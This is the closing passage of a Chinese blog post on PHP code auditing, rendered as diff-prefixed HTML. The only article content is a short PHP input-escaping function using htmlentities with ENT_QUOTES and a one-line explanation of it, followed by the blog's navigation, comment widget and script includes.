+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">escape_input</span>(<span class="hljs-params"><span class="hljs-variable">$data</span></span>) </span>&#123;<br>    <span class="hljs-keyword">return</span> (!<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$data</span>) || strlen(<span class="hljs-variable">$data</span>)==<span class="hljs-number">0</span>) ? <span class="hljs-string">&#x27;&#x27;</span> : htmlentities(<span class="hljs-variable">$data</span>, ENT_QUOTES);<br>&#125;<br></code></pre></td></tr></table></figure>
+
+<p>htmlentities 将字符转换为 HTML 转义字符，ENT_QUOTES 标识表示既转换双引号也转换单引号。</p>
+
+            </div>
+            <hr>
+            <div>
+              <div class="post-metas mb-3">
+                
+                  <div class="post-meta mr-3">
+                    <i class="iconfont icon-category"></i>
+                    
+                      <a class="hover-with-bg" href="/categories/php%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/">php代码审计</a>
+                    
+                  </div>
+                
+                
+                  <div class="post-meta">
+                    <i class="iconfont icon-tags"></i>
+                    
+                      <a class="hover-with-bg" href="/tags/PHP/">PHP</a>
+                    
+                      <a class="hover-with-bg" href="/tags/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/">代码审计</a>
+                    
+                      <a class="hover-with-bg" href="/tags/%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/">漏洞复现</a>
+                    
+                  </div>
+                
+              </div>
+              
+                <p class="note note-warning">
+                  
+                    本博客所有文章除特别声明外，均采用 <a target="_blank" href="https://creativecommons.org/licenses/by-sa/4.0/deed.zh" rel="nofollow noopener noopener">CC BY-SA 4.0 协议</a> ，转载请注明出处！
+                  
+                </p>
+              
+              
+                <div class="post-prevnext">
+                  <article class="post-prev col-6">
+                    
+                    
+                      <a href="/2021/09/12/dedecms/">
+                        <i class="iconfont icon-arrowleft"></i>
+                        <span class="hidden-mobile">通过 DedeCMS 学习 php 代码审计</span>
+                        <span class="visible-mobile">上一篇</span>
+                      </a>
+                    
+                  </article>
+                  <article class="post-next col-6">
+                    
+                    
+                      <a href="/2021/09/12/yii2/">
+                        <span class="hidden-mobile">Yii2 反序列化利用链总结</span>
+                        <span class="visible-mobile">下一篇</span>
+                        <i class="iconfont icon-arrowright"></i>
+                      </a>
+                    
+                  </article>
+                </div>
+              
+            </div>
+
+            
+              <!-- Comments -->
+              <article class="comments" id="comments" lazyload>
+                
+                  
+                
+                
+  <div id="valine"></div>
+  <script type="text/javascript">
+    Fluid.utils.loadComments('#valine', function() {
+      Fluid.utils.createScript('https://cdn.jsdelivr.net/npm/valine@1.4.14/dist/Valine.min.js', function() {
+        var options = Object.assign(
+          {"appId":"KoUUnhC8sqDPadKwA0C4f83s-gzGzoHsz","appKey":"FLKClsTKX9X9TPMSO1z9FK1T","placeholder":"说点什么","path":"window.location.pathname","avatar":"robohash","meta":["nick","mail","link"],"pageSize":10,"lang":"zh-CN","highlight":false,"recordIP":false,"serverURLs":"","emojiCDN":null,"emojiMaps":null,"enableQQ":false,"requiredFields":[]},
+          {
+            el: "#valine",
+            path: window.location.pathname
+          }
+        )
+        new Valine(options);
+      });
+    });
+  </script>
+  <noscript>Please enable JavaScript to view the comments</noscript>
+
+
+              </article>
+            
+          </article>
+        </div>
+      </div>
+    </div>
+    
+      <div class="d-none d-lg-block col-lg-2 toc-container" id="toc-ctn">
+        <div id="toc">
+  <p class="toc-header"><i class="iconfont icon-list"></i>&nbsp;目录</p>
+  <div class="toc-body" id="toc-body"></div>
+</div>
+
+      </div>
+    
+  </div>
+</div>
+
+<!-- Custom -->
+
+
+    
+
+    
+      <a id="scroll-top-button" href="#" role="button">
+        <i class="iconfont icon-arrowup" aria-hidden="true"></i>
+      </a>
+    
+
+    
+      <div class="modal fade" id="modalSearch" tabindex="-1" role="dialog" aria-labelledby="ModalLabel"
+     aria-hidden="true">
+  <div class="modal-dialog modal-dialog-scrollable modal-lg" role="document">
+    <div class="modal-content">
+      <div class="modal-header text-center">
+        <h4 class="modal-title w-100 font-weight-bold">搜索</h4>
+        <button type="button" id="local-search-close" class="close" data-dismiss="modal" aria-label="Close">
+          <span aria-hidden="true">&times;</span>
+        </button>
+      </div>
+      <div class="modal-body mx-3">
+        <div class="md-form mb-5">
+          <input type="text" id="local-search-input" class="form-control validate">
+          <label data-error="x" data-success="v"
+                 for="local-search-input">关键词</label>
+        </div>
+        <div class="list-group" id="local-search-result"></div>
+      </div>
+    </div>
+  </div>
+</div>
+    
+
+    
+  </main>
+
+  <footer class="text-center mt-5 py-3">
+  <div class="footer-content">
+     <a href="https://hexo.io" target="_blank" rel="nofollow noopener"><span>Hexo</span></a> <i class="iconfont icon-love"></i> <a href="https://github.com/fluid-dev/hexo-theme-fluid" target="_blank" rel="nofollow noopener"><span>Fluid</span></a> 
+  </div>
+  
+  <div class="statistics">
+    
+    
+
+    
+      
+        <!-- 不蒜子统计PV -->
+        <span id="busuanzi_container_site_pv" style="display: none">
+            总访问量 
+            <span id="busuanzi_value_site_pv"></span>
+             次
+          </span>
+      
+      
+        <!-- 不蒜子统计UV -->
+        <span id="busuanzi_container_site_uv" style="display: none">
+            总访客数 
+            <span id="busuanzi_value_site_uv"></span>
+             人
+          </span>
+      
+    
+  </div>
+
+
+  
+
+  
+</footer>
+
+
+  <!-- SCRIPTS -->
+  
+  <script  src="https://cdn.jsdelivr.net/npm/nprogress@0.2.0/nprogress.min.js" ></script>
+  <link  rel="stylesheet" href="https://cdn.jsdelivr.net/npm/nprogress@0.2.0/nprogress.min.css" />
+
+  <script>
+    NProgress.configure({"showSpinner":false,"trickleSpeed":100})
+    NProgress.start()
+    window.addEventListener('load', function() {
+      NProgress.done();
+    })
+  </script>
+
+
+<script  src="https://cdn.jsdelivr.net/npm/jquery@3.6.0/dist/jquery.min.js" ></script>
+<script  src="https://cdn.jsdelivr.net/npm/bootstrap@4.6.0/dist/js/bootstrap.min.js" ></script>
+<script  src="/js/events.js" ></script>
+<script  src="/js/plugins.js" ></script>
+
+<!-- Plugins -->
+
+
+  
+    <script  src="/js/img-lazyload.js" ></script>
+  
+
+
+
+  
+
+
+
+  <script  src="https://cdn.jsdelivr.net/npm/tocbot@4.12.3/dist/tocbot.min.js" ></script>
+
+
+
+  <script  src="https://cdn.jsdelivr.net/npm/@fancyapps/fancybox@3.5.7/dist/jquery.fancybox.min.js" ></script>
+
+
+
+  <script  src="https://cdn.jsdelivr.net/npm/anchor-js@4.3.1/anchor.min.js" ></script>
+
+
+
+  <script defer src="https://cdn.jsdelivr.net/npm/clipboard@2.0.8/dist/clipboard.min.js" ></script>
+
+
+
+  <script  src="/js/local-search.js" ></script>
+
+
+
+  <script defer src="https://busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js" ></script>
+
+
+
+
+  <script  src="https://cdn.jsdelivr.net/npm/typed.js@2.0.12/lib/typed.min.js" ></script>
+  <script>
+    (function (window, document) {
+      var typing = Fluid.plugins.typing;
+      var title = document.getElementById('subtitle').title;
+      
+      typing(title)
+      
+    })(window, document);
+  </script>
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+<!-- 主题的启动项 保持在最底部 -->
+<script  src="/js/boot.js" ></script>
+
+
+</body>
+</html>
